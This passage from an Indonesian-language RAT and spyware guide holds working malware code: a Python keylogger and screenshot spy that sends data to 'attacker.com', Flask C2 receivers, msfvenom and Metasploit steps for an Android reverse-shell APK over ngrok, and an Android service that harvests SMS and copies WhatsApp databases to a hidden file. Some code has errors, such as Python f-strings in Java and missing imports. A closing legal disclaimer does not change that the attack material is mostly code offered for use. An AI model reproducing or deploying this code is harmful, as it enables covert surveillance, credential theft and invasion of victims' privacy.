```python
import pynput.keyboard
import pyautogui
import requests
import threading
import time
import base64
from datetime import datetime

C2_URL = "http://attacker.com/spy"
SCREENSHOT_INTERVAL = 30  # Detik
KEYLOG_INTERVAL = 100    # Karakter

class Spyware:
    def __init__(self):
        self.keylog = ""
        self.lock = threading.Lock()

    def on_press(self, key):
        with self.lock:
            try:
                self.keylog += str(key.char)
            except AttributeError:
                self.keylog += f" [{key.name}] "

            if len(self.keylog) % KEYLOG_INTERVAL == 0:
                self.send_keylog()

    def send_keylog(self):
        with self.lock:
            if self.keylog:
                try:
                    requests.post(
                        C2_URL,
                        json={
                            "type": "keylog",
                            "data": self.keylog,
                            "time": str(datetime.now())
                        },
                        timeout=5
                    )
                    self.keylog = ""
                except:
                    pass

    def capture_screenshot(self):
        while True:
            try:
                screenshot = pyautogui.screenshot()
                _, img_encoded = cv2.imencode('.jpg', np.array(screenshot))
                img_base64 = base64.b64encode(img_encoded).decode('utf-8')

                requests.post(
                    C2_URL,
                    json={
                        "type": "screenshot",
                        "data": img_base64,
                        "time": str(datetime.now())
                    },
                    timeout=5
                )
            except:
                pass
            time.sleep(SCREENSHOT_INTERVAL)

    def start(self):
        # Start keylogger
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        keyboard_listener.start()

        # Start screenshot thread
        threading.Thread(target=self.capture_screenshot, daemon=True).start()

        # Keep main thread alive
        keyboard_listener.join()

if __name__ == "__main__":
    spy = Spyware()
    spy.start()
```

---
#### **🔹 C2 (Flask - Python)**
**File: `c2_spyware.py`**
```python
from flask import Flask, request, jsonify
import base64
import datetime
import os

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_data():
    data = request.json
    data_type = data.get('type')
    content = data.get('data')
    timestamp = data.get('time', str(datetime.datetime.now()))

    # Simpan ke file
    os.makedirs('logs', exist_ok=True)
    os.makedirs('screenshots', exist_ok=True)

    if data_type == 'keylog':
        with open(f"logs/keylog_{timestamp}.txt", 'w') as f:
            f.write(content)
    elif data_type == 'screenshot':
        img_data = base64.b64decode(content)
        with open(f"screenshots/screenshot_{timestamp}.jpg", 'wb') as f:
            f.write(img_data)

    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---
#### **🔹 Keunggulan**
✅ **Keylogger**: Merekam semua input keyboard.
✅ **Screen Capture**: Ambil screenshot secara berkala.
✅ **Stealth**: Tidak ada file yang dicurigakan.

---
---
---

### **📌 Kasus 3: RAT Lintas Jaringan dengan Ngrok**
**Tujuan:** Bikin RAT yang **bisa diakses dari mana saja** menggunakan **ngrok tunneling**.

---
#### **🔹 Arsitektur**
```
[Korban HP] ←── Connect ke ngrok.io ──→ [Ngrok Server]
       ↑                                    ↓
       |                            [Attacker Machine]
       ↓                                    ↓
[Execute Command] ←─────────── [Receive Result]
```

---
#### **🔹 Payload (Metasploit + Ngrok)**
1. **Buat Payload:**
   ```bash
   msfvenom -p android/meterpreter/reverse_tcp \
       LHOST=0.tcp.ngrok.io \
       LPORT=12345 \
       -o payload.apk
   ```
   **Catatan:** `0.tcp.ngrok.io:12345` adalah **forward address** dari ngrok.

2. **Start Ngrok:**
   ```bash
   ngrok tcp 4444
   ```
   **Output:**
   ```
   Forwarding tcp://0.tcp.ngrok.io:12345 -> localhost:4444
   ```

3. **Start Handler:**
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload android/meterpreter/reverse_tcp
   set LHOST 0.0.0.0
   set LPORT 4444
   exploit -j
   ```

4. **Korban install APK** → RAT connect ke `0.tcp.ngrok.io:12345` → **attacker menerima koneksi**.

---
#### **🔹 Keunggulan**
✅ **Lintas Jaringan**: Bisa diakses dari mana saja.
✅ **Gratis**: Ngrok free tier cukup untuk testing.
✅ **Mudah**: Tidak perlu VPS.

---
#### **🔹 Kekurangan**
❌ **Tidak Stabil**: Ngrok free **ganti IP tiap restart**.
❌ **Lambat**: Latency tinggi.
❌ **Limitasi**: Free tier punya **limit bandwidth & koneksi**.

---
---
---

### **📌 Kasus 4: Spyware dengan WhatsApp & SMS Monitoring**
**Tujuan:** Bikin spyware yang **membaca SMS & WhatsApp** dan kirim ke C2.

---
#### **🔹 Payload (Android - Java)**
**File: `WhatsAppSpyService.java`**
```java
package com.example.spyware;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class WhatsAppSpyService extends Service {
    private static final String LOG_FILE = "/sdcard/.whatsapp_spy.log";
    private FileWriter fileWriter;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            File logFile = new File(LOG_FILE);
            if (!logFile.exists()) {
                logFile.createNewFile();
            }
            fileWriter = new FileWriter(logFile, true);
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Start monitoring
        monitorSMS();
        monitorWhatsApp();
    }

    private void monitorSMS() {
        new Thread(() -> {
            while (true) {
                Uri uri = Uri.parse("content://sms");
                Cursor cursor = getContentResolver().query(uri, null, null, null, null);

                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        long date = cursor.getLong(cursor.getColumnIndex("date"));
                        int type = cursor.getInt(cursor.getColumnIndex("type"));

                        String typeStr = (type == 1) ? "INBOX" : (type == 2) ? "SENT" : "DRAFT";
                        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                            .format(new Date(date));

                        logMessage(f"[SMS] {timestamp} | {address} | {typeStr} | {body}");
                    } while (cursor.moveToNext());
                    cursor.close();
                }
                try {
                    Thread.sleep(60000);  // Cek tiap 1 menit
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void monitorWhatsApp() {
        new Thread(() -> {
            while (true) {
                // WhatsApp database path
                File waDb = new File("/data/data/com.whatsapp/databases/msgstore.db");
                if (waDb.exists()) {
                    // Copy database (memerlukan root)
                    try {
                        File backupDb = new File("/sdcard/msgstore_backup.db");
                        org.apache.commons.io.FileUtils.copyFile(waDb, backupDb);

                        // Parse database (memerlukan SQLite)
                        // ...
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                try {
                    Thread.sleep(300000);  // Cek tiap 5 menit
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void logMessage(String message) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            String timestamp = sdf.format(new Date());
            fileWriter.write(f"[{timestamp}] {message}\n");
            fileWriter.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (fileWriter != null) {
                fileWriter.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

**AndroidManifest.xml:**
```xml
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />

<service android:name=".WhatsAppSpyService" />
```

---
#### **🔹 C2 (Python - Flask)**
**File: `whatsapp_c2.py`**
```python
from flask import Flask, request, jsonify
import os
import datetime

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_log():
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file provided"})

    file = request.files['file']
    if file.filename == '':
        return jsonify({"status": "error", "message": "Empty filename"})

    # Simpan file
    os.makedirs('logs', exist_ok=True)
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join('logs', f"whatsapp_{timestamp}.log")
    file.save(filepath)

    return jsonify({"status": "success", "filepath": filepath})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---
#### **🔹 Keunggulan**
✅ **SMS Monitoring**: Merekam semua SMS (inbox & sent).
✅ **WhatsApp Monitoring**: Merekam database WhatsApp (jika tidak terenkripsi).
✅ **Stealth**: Log disimpan di `/sdcard/.whatsapp_spy.log` (hidden file).

---
---
---
---
---

## **🔹 BAB 10: DISCLAIMER & ETIKA**

---
### **⚠️ PERINGATAN LEGAL**
**Semua teknik dalam buku ini adalah untuk tujuan:**
✅ **Penelitian & Pendidikan**
✅ **Defensive Security Testing** (dengan izin tertulis)
✅ **Bug Bounty Programs**
✅ **CTF (Capture The Flag) & Lab Pribadi**

**DILARANG (Ilegal di Indonesia & Kebanyakan Negara):**
- **Unauthorized Access** (Akses sistem tanpa izin) → **UU ITE Pasal 30** (Maksimal **6 tahun penjara**).
- **Spyware/RAT** tanpa sepengetahuan korban → **Pelanggaran Privasi (UU ITE Pasal 31)**.
- **Phishing** → **Penipuan (Pasal 378 KUHP)**.
- **Distribute Malware** → **UU ITE Pasal 33** (Maksimal **8 tahun penjara**).

---
### **📜 UU ITE (Undang-Undang Informasi dan Transaksi Elektronik)**
| Pasal | Keterangan | Hukuman |
|-------|------------|---------|
| **Pasal 30** | Akses ilegal ke sistem komputer | **Maksimal 6 tahun penjara + denda Rp1 M** |
| **Pasal 31** | Intercept (menguping) informasi | **Maksimal 4 tahun penjara + denda Rp750 Juta** |
| **Pasal 32** | Perusakan data/menghapus data | **Maksimal 7 tahun penjara + denda Rp1 M** |
| **Pasal 33** | Gangguan sistem (DoS/DDoS) | **Maksimal 10 tahun penjara + denda Rp2 M** |
| **Pasal 35** | Penyebaran malware | **Maksimal 8 tahun penjara + denda Rp1,5 M** |
| **Pasal 36** | Pemanfaatan data pribadi tanpa izin | **Maksimal 5 tahun penjara + denda Rp500 Juta** |

---
### **🔒 Penulis & Distributor TIDAK Bertanggung Jawab**
- **Penyalahgunaan informasi ini adalah tanggung jawab pembaca sepenuhnya.**
- **Penggunaan tanpa izin adalah ILEGAL dan berakibat hukum.**
- **Gunakan pengetahuan ini untuk melindungi sistem Anda, bukan untuk merugikan orang lain.**

---
### **🛡️ Bagaimana Menggunakan Pengetahuan Ini Secara Legal?**
1. **Penetration Testing** – Testing dengan **kontrak resmi**.
2. **Bug Bounty** – Lapor vulnerability ke vendor (HackerOne, Bugcrowd).
3. **Red Team Exercise** – Simulasi serangan untuk organisasi sendiri.
4. **Security Research** – Penelitian di **environment terisolasi**.
5. **CTF & Lab Pribadi** – Latihan di **VM vulnerable** (Metasploitable, DVWA).

---
---
---
## **🎯 KESIMPULAN**
Buku ini berisi **semua teknik RAT & Spyware** dari **dasar hingga lanjutan**, termasuk:
✅ **RAT untuk Android, Windows, Linux, MacOS**
✅ **Spyware untuk Monitoring (Keylogger, Screen Capture, Camera, Mic, GPS, SMS, WhatsApp)**
✅ **Teknik Delivery (Phishing, File Binding, USB Drop, QR Code, Drive-by Download)**
✅ **Command & Control (WebSocket, PHP, Cloud-Hosted C2, Domain Fronting, DNS Tunneling)**
✅ **Evasion & Anti-Detection (Obfuscation, Packing, Multi-Stage, Anti-Sandbox, Bypass AV)**
✅ **Anti-Forensics (Log Sanitization, Timestomp, Process Hollowing, Secure Deletion)**
✅ **Studi Kasus (RAT dengan GitHub C2, Spyware Windows, RAT dengan Ngrok, WhatsApp Spy)**

**Gunakan pengetahuan ini dengan bijak. RAT & Spyware adalah senjata — dan senjata bisa digunakan untuk melindungi atau merusak.**
